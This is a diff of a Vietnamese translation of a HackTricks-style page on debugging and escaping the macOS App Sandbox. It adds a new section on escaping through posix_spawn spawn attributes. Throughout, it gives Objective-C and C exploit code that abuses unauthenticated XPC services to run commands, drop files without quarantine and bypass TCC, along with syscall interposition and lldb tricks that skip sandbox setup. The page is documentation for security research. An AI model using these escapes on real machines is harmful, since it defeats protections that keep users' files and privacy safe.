@@ -1,41 +1,41 @@
-# Debug & bypass macOS Sandbox
+# Debug & Bypass macOS Sandbox
 
 {{#include ../../../../../banners/hacktricks-training.md}}
 
-## Quy trình nạp sandbox
+## Quy trình tải Sandbox
 
 <figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Hình ảnh từ <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
 
-Trong hình ảnh trước, có thể thấy **sandbox được nạp như thế nào** khi chạy một ứng dụng có entitlement **`com.apple.security.app-sandbox`**.
+Trong hình trên, có thể thấy **Sandbox được tải như thế nào** khi chạy một ứng dụng có entitlement **`com.apple.security.app-sandbox`**.
 
-Compiler sẽ liên kết `/usr/lib/libSystem.B.dylib` vào binary.
+Compiler sẽ liên kết `/usr/lib/libSystem.B.dylib` với binary.
 
-Sau đó, **`libSystem.B`** gọi một số hàm cho đến khi **`xpc_pipe_routine`** gửi các entitlement của ứng dụng đến **`securityd`**. Securityd kiểm tra xem tiến trình có cần bị cách ly trong sandbox hay không và thực hiện cách ly nếu cần.\
-Cuối cùng, sandbox được kích hoạt bằng lời gọi **`__sandbox_ms`**, hàm này gọi **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>
+Sau đó, **`libSystem.B`** gọi một số hàm cho đến khi **`xpc_pipe_routine`** gửi entitlements của ứng dụng đến **`securityd`**. Securityd kiểm tra xem process có nên bị cách ly trong Sandbox hay không và, nếu có, sẽ cách ly process đó.\
+Cuối cùng, Sandbox được kích hoạt bằng lời gọi **`__sandbox_ms`**, hàm này gọi **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>
 
-## Các cách bypass khả thi
+## Các cách Bypass khả thi
 
 ### Bypass thuộc tính quarantine
 
-**Các file được tạo bởi tiến trình chạy trong sandbox** sẽ được gắn **thuộc tính quarantine** để ngăn sandbox escape: nếu bạn thả một ứng dụng mới vào đó rồi thử khởi chạy, cờ quarantine sẽ chặn ứng dụng. Do đó, **nếu có thể thả một file hoặc thư mục *không có* thuộc tính quarantine, bạn có thể thoát khỏi App Sandbox** — chỉ cần thả một bundle `.app` rồi khởi chạy bằng `open`, vì tiến trình mới được khởi chạy dưới LaunchServices chứ không phải trong sandbox của bạn.
+**Các file do process trong Sandbox tạo ra** được gắn **thuộc tính quarantine** để ngăn Sandbox escape: nếu bạn thả một ứng dụng mới vào rồi cố chạy nó, cờ quarantine sẽ chặn ứng dụng. Vì vậy, **nếu bạn có thể thả một file hoặc thư mục *không có* thuộc tính quarantine, bạn có thể thoát khỏi App Sandbox** — chỉ cần thả một bundle `.app` rồi khởi chạy bằng `open`, vì process mới được khởi chạy dưới LaunchServices chứ không phải trong Sandbox của bạn.
 
-Cách đáng tin cậy để **thả file không có quarantine** là yêu cầu **một tiến trình khác tạo file đó giúp bạn**. Như Mickey Jin trình bày trong [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), **App Sandbox** gắn quarantine cho các file được thả, nhưng **dịch vụ XPC chạy trong Service Sandbox thì không**. Vì vậy, có thể dùng một số dịch vụ XPC không yêu cầu xác thực làm primitive "rửa quarantine":<sup>[[4]](#references)</sup>
+Cách đáng tin cậy để **thả file không có quarantine** là yêu cầu **một process khác tạo file đó giúp bạn**. Như Mickey Jin đã ghi lại trong [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), **App Sandbox** gắn quarantine vào các file được thả, nhưng **các dịch vụ XPC chạy dưới Service Sandbox thì không**. Do đó, có thể dùng một số dịch vụ XPC không cần xác thực làm primitive để "rửa quarantine":<sup>[[4]](#references)</sup>
 
-- **CVE-2023-27944** (`TrialArchivingService`) và **CVE-2023-32414** (`ArchiveService`): giải nén archive do ứng dụng chạy trong sandbox cung cấp vào vị trí được chọn **mà không truyền tiếp xattr quarantine** cho nội dung đã giải nén.
+- **CVE-2023-27944** (`TrialArchivingService`) và **CVE-2023-32414** (`ArchiveService`): giải nén archive do ứng dụng trong Sandbox cung cấp vào một vị trí tùy chọn **mà không truyền xattr quarantine sang nội dung được giải nén**.
 - **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): lỗi path traversal trong `submitSignpostDataWithConfig:` cho phép tạo **các thư mục tùy ý không có quarantine**, đủ để dựng toàn bộ cấu trúc bundle `.app` bên ngoài container.
-- **CVE-2024-27864** (`diskimagescontroller.xpc`): gắn một DMG có quarantine **mà không gắn quarantine cho thiết bị được tạo ra**, nhờ vậy có thể khởi chạy ứng dụng trên volume đã mount.
+- **CVE-2024-27864** (`diskimagescontroller.xpc`): gắn một DMG có quarantine **mà không gắn quarantine vào thiết bị được tạo ra**, nhờ đó có thể khởi chạy các ứng dụng trên volume đã mount.
 
 > [!TIP]
-> Thao tác giải nén thường **loại bỏ bit quyền thực thi**. Workaround được dùng trong CVE-2023-27944 là đặt một **symlink** trỏ đến binary hệ thống đã ký sẵn (ví dụ `/System/Library/CoreServices/Automator Application Stub`) làm executable chính của bundle. Cách này giúp có thể khởi chạy bundle mà không cần quyền `+x` trên file được thả.
+> Quá trình giải nén thường **loại bỏ bit quyền thực thi**. Cách khắc phục được dùng trong CVE-2023-27944 là đặt một **symlink** trỏ đến binary hệ thống đã ký có sẵn (ví dụ: `/System/Library/CoreServices/Automator Application Stub`) làm executable chính của bundle, nhờ đó vẫn có thể khởi chạy mà không cần `+x` trên file được thả.
 
 > [!CAUTION]
-> Cách này hoạt động vì bước kiểm tra dựa trên **cờ của mục được khởi chạy**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, rồi mới *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Không có cờ trên bundle bạn khởi chạy đồng nghĩa với việc không cần qua bước kiểm tra của Gatekeeper — đây chính là primitive mà các CVE trên cung cấp.<sup>[[5]](#references)</sup>
+> Cách này hoạt động vì việc kiểm tra dựa trên **cờ của mục được khởi chạy**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, và chỉ sau đó *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Bundle được khởi chạy không có cờ đồng nghĩa với việc không qua Gatekeeper — đây chính xác là primitive mà các CVE bên trên cung cấp.<sup>[[5]](#references)</sup>
 >
-> Lưu ý rằng nếu một bundle `.app` đã được cấp quyền chạy (nó có xattr quarantine với cờ "authorized to run"), bạn cũng có thể lạm dụng bundle đó... tuy nhiên, giờ đây bạn không thể ghi vào bên trong các bundle **`.app`** trừ khi có một số quyền TCC đặc quyền (mà bạn sẽ không có trong sandbox).
+> Lưu ý rằng nếu một bundle `.app` đã được cấp quyền chạy (có xattr quarantine với cờ "authorized to run"), bạn cũng có thể lạm dụng nó... tuy nhiên, lúc này bạn không thể ghi vào bên trong bundle **`.app`** trừ khi có một số quyền TCC đặc quyền (mà bạn sẽ không có trong Sandbox).
 
 ### Lạm dụng chức năng Open
 
-Trong [**các ví dụ cuối cùng về bypass sandbox của Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), có thể thấy chức năng CLI **`open`** bị lạm dụng để bypass sandbox như thế nào.
+Trong [**các ví dụ cuối về Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), có thể thấy cách lạm dụng chức năng CLI **`open`** để bypass Sandbox.
 
 
 {{#ref}}
@@ -44,38 +44,38 @@ macos-office-sandbox-bypasses.md
 
 ### Launch Agents/Daemons
 
-Ngay cả khi một ứng dụng **được thiết kế để chạy trong sandbox** (`com.apple.security.app-sandbox`), vẫn có thể bypass sandbox nếu ứng dụng được **chạy từ LaunchAgent** (ví dụ `~/Library/LaunchAgents`).\
-Như giải thích trong [**bài viết này**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), nếu muốn duy trì persistence bằng một ứng dụng chạy trong sandbox, bạn có thể thiết lập để ứng dụng tự động chạy dưới dạng LaunchAgent và có thể inject mã độc thông qua các biến môi trường DyLib.<sup>[[6]](#references)</sup>
+Ngay cả khi một ứng dụng **được thiết kế để chạy trong Sandbox** (`com.apple.security.app-sandbox`), vẫn có thể bypass Sandbox nếu ứng dụng được **chạy từ LaunchAgent** (ví dụ: `~/Library/LaunchAgents`).\
+Như được giải thích trong [**bài viết này**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), nếu muốn duy trì persistence bằng một ứng dụng chạy trong Sandbox, bạn có thể thiết lập để ứng dụng tự động chạy dưới dạng LaunchAgent và có thể inject mã độc thông qua các biến môi trường DyLib.<sup>[[6]](#references)</sup>
 
-### Lạm dụng các vị trí tự khởi động
+### Lạm dụng các vị trí tự khởi chạy
 
-Nếu một tiến trình chạy trong sandbox có thể **ghi** vào một vị trí mà **sau đó một ứng dụng không chạy trong sandbox sẽ thực thi binary**, tiến trình đó có thể **thoát sandbox chỉ bằng cách đặt** binary vào đó. Các vị trí điển hình thuộc loại này là `~/Library/LaunchAgents` hoặc `/System/Library/LaunchDaemons`.
+Nếu một process trong Sandbox có thể **ghi** vào nơi mà **một ứng dụng không chạy trong Sandbox sẽ chạy binary sau đó**, nó có thể **thoát Sandbox chỉ bằng cách đặt** binary ở đó. `~/Library/LaunchAgents` hoặc `/System/Library/LaunchDaemons` là những ví dụ điển hình về các vị trí như vậy.
 
-Trong trường hợp này, thậm chí có thể cần **2 bước**: khiến một tiến trình có **sandbox ít hạn chế hơn** (`file-read*`, `file-write*`) thực thi mã của bạn; mã này sẽ ghi vào một vị trí mà sau đó được **thực thi ngoài sandbox**.
+Trong trường hợp này, bạn thậm chí có thể cần **2 bước**: khiến một process có **Sandbox ít hạn chế hơn** (`file-read*`, `file-write*`) thực thi mã của bạn; mã này sẽ ghi vào một vị trí mà sau đó sẽ được **thực thi ngoài Sandbox**.
 
-Xem trang này về **các vị trí tự khởi động**:
+Xem trang này về **các vị trí tự khởi chạy**:
 
 
 {{#ref}}
 ../../../../macos-auto-start-locations.md
 {{#endref}}
 
-### Lạm dụng các tiến trình khác
+### Lạm dụng các process khác
 
-Nếu từ tiến trình chạy trong sandbox, bạn có thể **chiếm quyền các tiến trình khác** chạy trong sandbox ít hạn chế hơn (hoặc không có sandbox), bạn sẽ có thể thoát sang sandbox của chúng:
+Nếu từ process trong Sandbox đó, bạn có thể **xâm nhập các process khác** đang chạy trong Sandbox ít hạn chế hơn (hoặc không có Sandbox), bạn sẽ có thể thoát sang các Sandbox của chúng:
 
 
 {{#ref}}
 ../../../macos-proces-abuse/
 {{#endref}}
 
-### Các Mach service hệ thống và người dùng khả dụng
+### Các dịch vụ Mach của hệ thống và người dùng có thể sử dụng
 
-Sandbox cũng cho phép giao tiếp với một số **Mach service** thông qua XPC được định nghĩa trong profile `application.sb`. Nếu có thể **lạm dụng** một trong các service này, bạn có thể **thoát khỏi sandbox**.
+Sandbox cũng cho phép giao tiếp với một số **dịch vụ Mach** thông qua XPC được định nghĩa trong profile `application.sb`. Nếu có thể **lạm dụng** một trong các dịch vụ này, bạn có thể **thoát Sandbox**.
 
-Như được nêu trong [bài phân tích này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), thông tin về Mach service được lưu trong `/System/Library/xpc/launchd.plist`. Có thể tìm tất cả Mach service hệ thống và người dùng bằng cách tìm `<string>System</string>` và `<string>User</string>` trong file đó.<sup>[[4]](#references)</sup>
+Như được chỉ ra trong [bài viết này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), thông tin về các dịch vụ Mach được lưu trong `/System/Library/xpc/launchd.plist`. Có thể tìm tất cả dịch vụ Mach của hệ thống và người dùng bằng cách tìm `<string>System</string>` và `<string>User</string>` trong file đó.<sup>[[4]](#references)</sup>
 
-Ngoài ra, có thể kiểm tra xem một Mach service có khả dụng với ứng dụng chạy trong sandbox hay không bằng cách gọi `bootstrap_look_up`:
+Ngoài ra, có thể kiểm tra xem một ứng dụng chạy trong Sandbox có thể sử dụng dịch vụ Mach hay không bằng cách gọi `bootstrap_look_up`:
 
 ```objectivec
 void checkService(const char *serviceName) {
@@ -100,32 +100,32 @@ void print_available_xpc(void) {
 }
 ```
 
-### Các Mach service PID hiện có
+### Các Mach services khả dụng trong PID
 
-Các Mach service này lần đầu bị khai thác để [thoát khỏi sandbox trong bài viết này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Vào thời điểm đó, **tất cả XPC service mà ứng dụng và framework của nó cần** đều hiển thị trong miền PID của ứng dụng (đây là các Mach Service có `ServiceType` là `Application`).<sup>[[4]](#references)</sup>
+Các Mach services này lần đầu bị khai thác để [thoát khỏi sandbox trong bài viết này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Vào thời điểm đó, **tất cả XPC services mà** một ứng dụng và framework của nó cần đều hiển thị trong miền PID của ứng dụng (đây là các Mach Services có `ServiceType` là `Application`).<sup>[[4]](#references)</sup>
 
-Để **liên hệ với một XPC service thuộc PID Domain**, chỉ cần đăng ký service đó bên trong ứng dụng bằng một dòng như sau:
+Để **kết nối với một XPC service trong PID Domain**, chỉ cần đăng ký service đó trong ứng dụng bằng một dòng như sau:
 
 ```objectivec
 [[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
 ```
 
-Ngoài ra, có thể tìm tất cả các Mach service **Application** bằng cách tìm `<string>Application</string>` trong `System/Library/xpc/launchd.plist`.
+Hơn nữa, có thể tìm tất cả các dịch vụ Mach **Application** bằng cách tìm `<string>Application</string>` bên trong `System/Library/xpc/launchd.plist`.
 
-Một cách khác để tìm các xpc service hợp lệ là kiểm tra những service trong:
+Một cách khác để tìm các dịch vụ xpc hợp lệ là kiểm tra những dịch vụ trong:
 
 ```bash
 find /System/Library/Frameworks -name "*.xpc"
 find /System/Library/PrivateFrameworks -name "*.xpc"
 ```
 
-Có thể tìm thấy một số ví dụ khai thác kỹ thuật này trong [**bài viết gốc**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), tuy nhiên, dưới đây là một số ví dụ tóm tắt.<sup>[[4]](#references)</sup>
+Có thể tìm thấy một số ví dụ khai thác kỹ thuật này trong [**bài viết gốc**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), tuy nhiên, sau đây là một số ví dụ tóm tắt.<sup>[[4]](#references)</sup>
 
 #### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
 
-Service này cho phép mọi kết nối XPC bằng cách luôn trả về `YES`, và method `runTask:arguments:withReply:` thực thi một lệnh tùy ý với các tham số tùy ý.
+Dịch vụ này cho phép mọi kết nối XPC bằng cách luôn trả về `YES`, còn phương thức `runTask:arguments:withReply:` thực thi một lệnh tùy ý với các tham số tùy ý.
 
-exploit này "đơn giản chỉ là":
+Cách khai thác “đơn giản như sau”:
 
 ```objectivec
 @protocol SKRemoteTaskRunnerProtocol
@@ -148,11 +148,11 @@ void exploit_storagekitfsrunner(void) {
 
 #### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
 
-XPC service này cho phép mọi client bằng cách luôn trả về `YES`, và method `createZipAtPath:hourThreshold:withReply:` chấp nhận đường dẫn đến một folder rồi nén folder đó thành file ZIP.
+XPC service này cho phép mọi client bằng cách luôn trả về `YES`, và phương thức `createZipAtPath:hourThreshold:withReply:` chấp nhận đường dẫn đến một thư mục rồi nén thư mục đó thành tệp ZIP.
 
-Do đó, có thể tạo cấu trúc folder của một app giả, nén nó, rồi giải nén và thực thi app đó để thoát khỏi sandbox, vì các file mới sẽ không có thuộc tính quarantine.
+Do đó, có thể tạo cấu trúc thư mục app giả, nén rồi giải nén và thực thi nó để thoát khỏi sandbox, vì các tệp mới sẽ không có thuộc tính quarantine.
 
-Exploit như sau:
+Exploit là:
 
 ```objectivec
 @protocol AudioAnalyticsHelperServiceProtocol
@@ -193,9 +193,9 @@ void exploit_AudioAnalyticsHelperService(void) {
 
 #### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
 
-Dịch vụ XPC này cho phép cấp quyền đọc và ghi đối với một URL tùy ý cho client XPC thông qua phương thức `extendAccessToURL:completion:`, vốn chấp nhận mọi kết nối. Vì dịch vụ XPC có FDA, có thể lợi dụng các quyền này để hoàn toàn bypass TCC.
+Dịch vụ XPC này cho phép cấp quyền đọc và ghi vào một URL bất kỳ cho client XPC thông qua phương thức `extendAccessToURL:completion:`, phương thức này chấp nhận mọi kết nối. Vì dịch vụ XPC có FDA, có thể lạm dụng các quyền này để bypass hoàn toàn TCC.
 
-Exploit như sau:
+Exploit hoạt động như sau:
 
 ```objectivec
 @protocol WFFileAccessHelperProtocol
@@ -234,7 +234,7 @@ void expoit_ShortcutsFileAccessHelper(NSString *target) {
 
 ### Shellcodes
 
-Lưu ý rằng **ngay cả shellcode** trên ARM64 cũng cần được liên kết với `libSystem.dylib`:
+Lưu ý rằng **ngay cả shellcodes** trên ARM64 cũng cần được liên kết với `libSystem.dylib`:
 
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
@@ -243,7 +243,7 @@ ld: dynamic executables or dylibs must link with libSystem.dylib for architectur
 
 ### Các hạn chế không được kế thừa
 
-Như đã giải thích trong **[phần bổ sung của bài viết này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, một hạn chế của sandbox như:<sup>[[4]](#references)</sup>
+Như đã giải thích trong **[phần bổ sung của bài viết này](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, một hạn chế của sandbox như sau:<sup>[[4]](#references)</sup>
 
 ```
 (version 1)
@@ -251,7 +251,7 @@ Như đã giải thích trong **[phần bổ sung của bài viết này](https:
 (deny file-write* (literal "/private/tmp/sbx"))
 ```
 
-có thể được bypass bằng cách một tiến trình mới thực thi, ví dụ:
+có thể bị bypass bằng cách một tiến trình mới thực thi, chẳng hạn:
 
 ```bash
 mkdir -p /tmp/poc.app/Contents/MacOS
@@ -260,11 +260,32 @@ chmod +x /tmp/poc.app/Contents/MacOS/poc
 open /tmp/poc.app
 ```
 
-Tuy nhiên, tất nhiên, tiến trình mới này sẽ không kế thừa entitlements hoặc đặc quyền từ tiến trình cha.
+Tuy nhiên, tất nhiên, process mới này sẽ không kế thừa entitlements hoặc privileges từ process cha.
+
+### Thay thế sandbox được kế thừa bằng spawn attributes (macOS cũ)
+
+Một process con `posix_spawn()` thông thường sẽ kế thừa sandbox của process cha. Trên các bản dựng macOS trước bản vá tháng 2 năm 2026, process cha đang bị sandbox giới hạn có thể thay vào đó truyền một **tên profile tích hợp sẵn** cho MAC policy `Sandbox` thông qua `posix_spawnattr_setmacpolicyinfo_np()`. Khi đó, process con nhận profile này *thay cho* các giới hạn của process cha. Profile tích hợp sẵn `no-network` vẫn cho phép truy cập thư mục home của người dùng, nên một process con như `/bin/bash` có thể thao tác với các file mà process cha App Sandbox không thể truy cập. Điều này khác với [đường đi LaunchServices `open`](#not-inherited-restrictions), trong đó một service riêng khởi chạy process. Xem [MACF policy-specific spawn attributes](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input) để biết đường đi input tổng quát.<sup>[[7]](#references)</sup>
+
+Để kiểm tra ranh giới này trên một **máy chủ macOS bị ảnh hưởng, đã được cô lập**, hãy tạo một canary vô hại trong thư mục home, bên ngoài app container. Chạy cùng một process con từ một process cha đã bị sandbox giới hạn: trước tiên bằng `posix_spawn()` thông thường, sau đó bằng blob Sandbox spawn-attribute chọn `no-network`; so sánh xem process con có thể đọc canary hay không. Đoạn mã sau sử dụng định nghĩa riêng tư `sandbox_spawnattr_t` và các khai báo hàm trong [sample launcher](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec) của Siguza. Hãy bổ sung xử lý lỗi thông thường khi tích hợp đoạn mã này vào ứng dụng kiểm thử.<sup>[[7]](#references)[[8]](#references)</sup>
+
+```c
+sandbox_spawnattr_t sb;
+posix_spawnattr_t attr;
+pid_t pid;
+char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
+sandbox_spawnattrs_init(&sb);
+sandbox_spawnattrs_setprofilename(&sb, "no-network");
+posix_spawnattr_init(&attr);
+posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
+int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
+if (!err) waitpid(pid, NULL, 0);
+```
+
+Một lần gọi `posix_spawn()` trả về thành công không chứng minh rằng đã thoát sandbox: hãy kiểm tra **quyền truy cập tệp thực tế của tiến trình con** so với baseline của tiến trình con thông thường. Các hệ thống đã vá sẽ từ chối profile tích hợp sẵn được yêu cầu bởi một caller đã ở trong sandbox, trừ khi caller có entitlement riêng tư `com.apple.private.security.sandbox-spawnattrs`. Đừng xem hành vi lịch sử này là một bypass hiện tại.<sup>[[7]](#references)</sup>
 
 ### Entitlements
 
-Lưu ý rằng một số **hành động** có thể được **sandbox cho phép** nếu ứng dụng có một **entitlement** cụ thể, chẳng hạn như:
+Lưu ý rằng ngay cả khi một số **hành động** có thể được **sandbox cho phép** nếu ứng dụng có một **entitlement** cụ thể, chẳng hạn như:
 
 ```scheme
 (when (entitlement "com.apple.security.network.client")
@@ -311,7 +332,7 @@ _libsecinit_initializer called
 Sandbox Bypassed!
 ```
 
-#### Interpost `__mac_syscall` để ngăn Sandbox
+#### Interpose `__mac_syscall` để ngăn Sandbox
 
 ```c:interpose.c
 // gcc -dynamiclib interpose.c -o interpose.dylib
@@ -357,7 +378,7 @@ __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
 
-### Debug & bypass Sandbox bằng lldb
+### Gỡ lỗi & bypass Sandbox bằng lldb
 
 Hãy biên dịch một ứng dụng cần được sandbox:
 
@@ -415,14 +436,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 ```
 
 > [!CAUTION]
-> Ứng dụng sẽ cố **đọc** tệp **`~/Desktop/del.txt`**, việc mà **Sandbox sẽ không cho phép**.\
-> Hãy tạo một tệp ở đó; sau khi vượt qua Sandbox, ứng dụng sẽ có thể đọc tệp này:
+> Ứng dụng sẽ cố **đọc** tệp **`~/Desktop/del.txt`**, nhưng **Sandbox sẽ không cho phép**.\
+> Hãy tạo một tệp ở đó, vì khi Sandbox được bypass, ứng dụng sẽ có thể đọc tệp đó:
 >
 > ```bash
 > echo "Sandbox Bypassed" > ~/Desktop/del.txt
 > ```
 
-Hãy debug ứng dụng để xem Sandbox được tải vào thời điểm nào:
+Hãy debug ứng dụng để xem Sandbox được tải khi nào:
 
 ```bash
 # Load app in debugging
@@ -501,14 +522,16 @@ Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
 
-> [!WARNING] > **Ngay cả khi đã bypass Sandbox, TCC vẫn sẽ hỏi người dùng có muốn cho phép tiến trình đọc các tệp trên desktop hay không**
+> [!WARNING] > **Ngay cả khi đã bypass Sandbox, TCC vẫn sẽ hỏi người dùng có muốn cho phép tiến trình đọc các tệp trong thư mục Desktop hay không**
 
 ## References
 
 - [1] [Jonathan Levin - Apple Sandbox: Đi sâu hơn vào vũng lầy (slide HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
 - [2] [Saagar Jha - Thoát khỏi Sandbox của Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
 - [3] [Jonathan Levin - Apple Sandbox: Đi sâu hơn vào vũng lầy (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
-- [4] [Mickey Jin - Kỷ nguyên mới của các vụ thoát khỏi macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
+- [4] [Mickey Jin - Kỷ nguyên mới của các vụ thoát Sandbox trên macOS](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
 - [5] [The Eclectic Light Company - Giải thích: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
-- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Bypass macOS TCC với Telegram bằng DyLib Injection (Phần 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
+- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Bypass macOS TCC bằng Telegram với DyLib Injection (Phần 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
+- [7] [Thoát khỏi Apple Sandbox bằng cách khởi chạy một executable](https://wts.dev/posts/sandbox-spawnattrs-escape/)
+- [8] [Siguza - sandbox-exec nhưng dành cho các profile tích hợp sẵn](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
 {{#include ../../../../../banners/hacktricks-training.md}}
